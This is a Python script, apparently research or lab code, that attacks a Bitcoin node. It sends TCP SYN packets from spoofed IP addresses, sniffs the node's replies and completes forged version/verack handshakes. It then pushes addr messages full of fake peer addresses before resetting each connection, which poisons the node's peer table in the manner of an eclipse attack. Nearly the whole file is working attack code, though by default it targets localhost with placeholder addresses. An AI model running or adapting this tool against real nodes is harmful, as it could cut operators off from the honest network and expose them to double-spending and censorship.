import random, socket, struct, os, array, random, time, threading

import bitcoin
from bitcoin.net import CAddress

from scapy.all import ETH_P_ALL, IP, MTU, send, select, sniff, TCP, UDP, Raw, conf, L3RawSocket, sr1, sendp

from bitcoin.messages import msg_version, msg_verack, msg_addr

class Sniff_And_Respond:
    def __init__(s, iface, target_ip, dport, sport, ips, connections):
        s.iface = iface
        s.target_ip = target_ip
        s.dport = dport
        s.sport = sport
        s.ips = ips
        s.connections = connections

        s.peers_forged = 0

    # Bitcoin utility functions
    def btc_add_magic(s, pkt):
        b = list(pkt.to_bytes())

        # b[0] = b'\x0b'
        # b[1] = b'\x11'
        # b[2] = b'\x09'
        # b[3] = b'\x07'

        return ''.join(b)

    def btc_addr_pkt(s, str_addrs):
        pkt = msg_addr()
        addrs = []
        for i in str_addrs:
            addr = CAddress()
            addr.port = s.dport
            addr.nTime = int(time.time()) #- timefloor + replacementtimefloor
            addr.ip = i
            addrs.append( addr )

        pkt.addrs = addrs
        pkt.to_bytes()

        return s.btc_add_magic(pkt)

    def btc_version_pkt(s, spoofed_ip):
        c = msg_version()
        c.nVersion = 70002
        c.addrTo.ip = s.target_ip 
        c.addrTo.port = s.dport

        c.addrFrom.ip = spoofed_ip
        c.addrFrom.port = s.sport

        return s.btc_add_magic(c)

    def btc_verack_pkt(s):
        return s.btc_add_magic(msg_verack())


    def respond(s, pkt):
        target_ip = s.target_ip
        PORT = s.dport
        RESP_PORT = s.sport

        start = time.time()

        if pkt[IP].src == s.target_ip:
            with s.connections.lock:
                if pkt[IP].dst in s.connections:
                    print "pkt[IP].dst", pkt[IP].dst, s.connections[ pkt[IP].dst ], pkt[TCP].flags

                    # This packet is both from the target and intented for us.                
                    if pkt[TCP].flags == 0x12 and s.connections[ pkt[IP].dst ] == "sent": #SYNACK received
                        #TCP connection established 

                        #Send version pkt #should this seqence number increase by the size of the previous pkt??
                        #combine the ack to the syn-ack with a pshm yeah!
                        p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='PA',ack=pkt.seq+1,seq=pkt.ack)/s.btc_version_pkt(pkt[IP].dst)
                        send(p, verbose=False)

                        print s.connections, pkt[IP].dst, pkt[IP].dst in s.connections
                        print "SYNACK"
                        s.connections[pkt[IP].dst] = "synack"

                    elif pkt[TCP].flags == 0x10: #ACK
                        pass

                    elif pkt[TCP].flags == 0x18: #PSH ACK - they are sending us data
                        payload = pkt[TCP].payload.load

                        if payload[4:11] == "version" and s.connections[pkt[IP].dst] == "synack":

                            s.connections[pkt[IP].dst] = "version"

                            if len( s.ips[pkt[IP].dst] ) == 0:
                                #RST - if we have no addrs to share
                                p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='PAR',ack=(pkt.seq+len(payload)),seq=pkt.ack)/s.btc_verack_pkt()
                                send(p, verbose=False)
                            else:
                                #if we have addrs to share keep the conneciton open
                                p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='PA',ack=(pkt.seq+len(payload)),seq=pkt.ack)/s.btc_verack_pkt()
                                send(p, verbose=False)


                        elif payload[4:10] == "verack" and s.connections[pkt[IP].dst] == "version": 
                            # verack received we are connected 
                            print "done"

                            s.connections[pkt[IP].dst] = "done"

                            if len( s.ips[pkt[IP].dst] ) > 0:
                                # print "sending addresses"
                                addrs = s.btc_addr_pkt(s.ips[pkt[IP].dst])
                                p= IP(dst=target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='PA',ack=(pkt.seq+len(payload)),seq=pkt.ack)/addrs
                                send(p, verbose=False)

                                s.peers_forged+=1
                                print s.peers_forged, pkt[IP].dst
                                time.sleep(4)

                                p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='R',seq=pkt.ack+len(s.btc_addr_pkt(s.ips[pkt[IP].dst])))
                                send(p, verbose=False)

                            else:
                                p= IP(dst=s.target_ip,src=pkt[IP].dst)/TCP(dport=PORT,sport=RESP_PORT, flags='AR',ack=(pkt.seq+len(payload)),seq=pkt.ack)
                                send(p, verbose=False)

    def start(s):         
        sniff(iface="lo", 
            prn=s.respond, 
            filter="tcp and host "+s.target_ip+" and port 8333", 
            store=0)



class ConnectionInitiator(threading.Thread):
     def __init__(s, iface, target_ip, dport, sport, ips, connections):
        s.iface = iface
        s.target_ip = target_ip
        s.dport = dport
        s.sport = sport
        s.ips = ips
        s.connections = connections

        super(ConnectionInitiator, s).__init__()

     def run(s):
        IPs = s.ips

        ip_index = 0
        new_index = 0
        tried_index = 0

        tried = []
        new = []

        for ip in IPs:
            if len(IPs[ip]) == 0:
                tried.append(ip)
            else:
                new.append(ip)

        ratio = len(tried)/len(new)

        if ratio == 1: ratio = 2

        print ratio, len(tried), len(new)


        while True:

            spoofed_ip = IPs.keys()[ip_index % len(IPs) ]

            if  len(tried) == 0 or ip_index % ratio == 0 :
                spoofed_ip = new[new_index % len(new) ]
                new_index+=1
            else:
                spoofed_ip = tried[tried_index % len(tried) ]
                tried_index+=1

            seq = random.randrange(0, 2**32)


            p=IP(dst=s.target_ip,src=spoofed_ip)/TCP(dport=s.dport,sport=s.sport,flags='S',seq=seq )


            send(p, verbose=True, iface=s.iface) # doesn't work if this is set to loopback
            # iface must be set to current internet connection

            with s.connections.lock:
                s.connections[spoofed_ip] = "sent"


            LAST_PACKET_SENT = int(time.time()*1000) 
            stop = time.time()

            print spoofed_ip, ip_index, time.time()

            ip_index+=1

            #time.sleep(0.2)
            time.sleep(3)

# Setup Rawsockets in scapy
conf.L3socket = L3RawSocket

# TODO: parameterize
iface = "eth0" #parameter
target_ip = "" #parameter
localhost = True  #parameter
if localhost:
    # Normally linux does not accept non-local ip addresses for TCP connections
    #  over the loopback but if you set sudo sysctl -w net.ipv4.conf.eth0.route_localnet=1
    #  it will work.
    target_ip  = "127.0.0.1"

dport = 8333 #parameter
sport = 28333 

ips = {
    '230.5.23.0': ['252.0.0.1', '252.1.0.10'],
    '230.5.23.1': ['252.0.0.2', '252.1.0.9'],
    '230.5.23.2': ['252.0.0.3', '252.1.0.8'],
    '230.5.23.3': ['252.0.0.4', '252.1.0.7'],
    '230.5.23.4': ['252.0.0.5', '252.1.0.6']
}

# While python dictionaries are threading-safe we perform multiple non-atomic 
#  operations. For ease of debugging we use a lock to ensure threads do not
#  perform interleaved operations.
class LockableDict(dict):
    def __init__(self):
        self.lock = threading.Lock()
connections = LockableDict()

#TODO: this should not be a thread
conn_thread = ConnectionInitiator(iface, target_ip, dport, sport, ips, connections)
conn_thread.daemon = True
conn_thread.start()

#TODO: this should be a thread
on_path_tap = Sniff_And_Respond(iface, target_ip, dport, sport, ips, connections)
on_path_tap.start()